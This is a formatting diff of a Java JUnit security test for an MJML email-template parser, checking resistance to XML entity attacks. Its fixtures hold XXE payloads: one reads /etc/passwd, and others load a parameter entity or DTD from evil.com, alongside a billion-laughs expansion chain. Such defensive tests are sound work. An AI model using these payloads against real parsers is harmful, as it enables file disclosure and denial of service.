@@ -3,7 +3,6 @@ package dev.jcputney.mjml.parser;
 import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
-import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import dev.jcputney.mjml.MjmlException;
@@ -16,11 +15,12 @@ import org.junit.jupiter.api.Test;
  * Tests verifying parser security protections against XXE and entity expansion attacks.
  *
  * <p>The MJML pipeline has two layers of defense:
+ *
  * <ol>
  *   <li>The preprocessor wraps "ending tag" content (mj-text, mj-button, etc.) in CDATA sections,
- *       which neutralizes any entity references within that content.</li>
- *   <li>The XML parser has FEATURE_SECURE_PROCESSING enabled and external entities disabled,
- *       which blocks entity expansion in non-CDATA contexts (attributes, structure).</li>
+ *       which neutralizes any entity references within that content.
+ *   <li>The XML parser has FEATURE_SECURE_PROCESSING enabled and external entities disabled, which
+ *       blocks entity expansion in non-CDATA contexts (attributes, structure).
  * </ol>
  */
 class ParserSecurityTest {
@@ -37,11 +37,14 @@ class ParserSecurityTest {
     factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
     factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
 
-    assertTrue(factory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING),
+    assertTrue(
+        factory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING),
         "FEATURE_SECURE_PROCESSING should be enabled");
-    assertFalse(factory.getFeature("http://xml.org/sax/features/external-general-entities"),
+    assertFalse(
+        factory.getFeature("http://xml.org/sax/features/external-general-entities"),
         "External general entities should be disabled");
-    assertFalse(factory.getFeature("http://xml.org/sax/features/external-parameter-entities"),
+    assertFalse(
+        factory.getFeature("http://xml.org/sax/features/external-parameter-entities"),
         "External parameter entities should be disabled");
   }
 
@@ -51,7 +54,8 @@ class ParserSecurityTest {
   void entityReferencesInMjTextAreNeutralizedByCdata() {
     // DTD-defined entities inside <mj-text> content get CDATA-wrapped by the preprocessor.
     // The entity reference becomes literal text, not an expansion.
-    String mjml = """
+    String mjml =
+        """
         <?xml version="1.0"?>
         <!DOCTYPE mjml [
           <!ENTITY payload "EXPANDED_PAYLOAD">
@@ -72,7 +76,8 @@ class ParserSecurityTest {
     // Either way, the entity should NOT be expanded.
     try {
       String html = MjmlRenderer.render(mjml).html();
-      assertFalse(html.contains("EXPANDED_PAYLOAD"),
+      assertFalse(
+          html.contains("EXPANDED_PAYLOAD"),
           "Entity should NOT be expanded — CDATA wrapping should neutralize it");
     } catch (MjmlException e) {
       // Also acceptable: parser rejects the document entirely
@@ -83,7 +88,8 @@ class ParserSecurityTest {
   @Test
   void billionLaughsInMjTextNeutralizedByCdata() {
     // Even with billion laughs DTD, the entity ref inside mj-text is CDATA-wrapped
-    String mjml = """
+    String mjml =
+        """
         <?xml version="1.0"?>
         <!DOCTYPE mjml [
           <!ENTITY lol "lol">
@@ -109,8 +115,7 @@ class ParserSecurityTest {
       long lolCount = html.chars().filter(c -> c == 'l').count();
       // A fully-expanded lol4 would have 10000 "lol" strings (30000 chars).
       // The CDATA wrapping prevents this explosion.
-      assertTrue(lolCount < 500,
-          "Entity expansion should be prevented by CDATA wrapping");
+      assertTrue(lolCount < 500, "Entity expansion should be prevented by CDATA wrapping");
     } catch (MjmlException e) {
       // Also acceptable: parser rejects the document
       assertNotNull(e.getMessage());
@@ -123,7 +128,8 @@ class ParserSecurityTest {
   void entityExpansionInAttributeValueIsHandled() {
     // Entities referenced in attribute values (not CDATA-wrapped by preprocessor)
     // are handled by the XML parser with FEATURE_SECURE_PROCESSING
-    String mjml = """
+    String mjml =
+        """
         <?xml version="1.0"?>
         <!DOCTYPE mjml [
           <!ENTITY injected "INJECTED_VALUE">
@@ -158,7 +164,8 @@ class ParserSecurityTest {
   void externalEntityInAttributeContextIsBlocked() {
     // Place external entity reference where the preprocessor won't CDATA-wrap it
     // Use a direct entity reference inside the XML structure
-    String xxe = """
+    String xxe =
+        """
         <?xml version="1.0"?>
         <!DOCTYPE mjml [
           <!ENTITY xxe SYSTEM "file:///etc/passwd">
@@ -178,7 +185,8 @@ class ParserSecurityTest {
     try {
       String html = MjmlRenderer.render(xxe).html();
       // If it renders, verify the external content was NOT included
-      assertFalse(html.contains("root:"),
+      assertFalse(
+          html.contains("root:"),
           "External entity content (/etc/passwd) should NOT appear in output");
     } catch (MjmlException e) {
       // Parser rejection is also acceptable
@@ -190,7 +198,8 @@ class ParserSecurityTest {
   void parameterEntityExternalIsRejected() {
     // Parameter entity variant of XXE — should be blocked by
     // external-parameter-entities being disabled
-    String paramEntity = """
+    String paramEntity =
+        """
         <?xml version="1.0"?>
         <!DOCTYPE mjml [
           <!ENTITY % ext SYSTEM "http://evil.com/xxe.dtd">
@@ -228,7 +237,9 @@ class ParserSecurityTest {
   @Test
   void externalDtdNotLoaded() {
     // Reference an external DTD that doesn't exist — should not cause a network request
-    String mjml = """
+    String mjml =
+        // language=MJML
+        """
         <?xml version="1.0"?>
         <!DOCTYPE mjml SYSTEM "http://evil.com/malicious.dtd">
         <mjml>
@@ -247,7 +258,8 @@ class ParserSecurityTest {
     try {
       String html = MjmlRenderer.render(mjml).html();
       assertNotNull(html);
-      assertTrue(html.contains("Content"),
+      assertTrue(
+          html.contains("Content"),
           "Document should render when external DTD is referenced but not loaded");
     } catch (MjmlException e) {
       // Also acceptable
@@ -259,7 +271,9 @@ class ParserSecurityTest {
 
   @Test
   void normalMjmlWithoutDtdStillWorks() {
-    String normalMjml = """
+    String normalMjml =
+        // language=MJML
+        """
         <mjml>
           <mj-body>
             <mj-section>
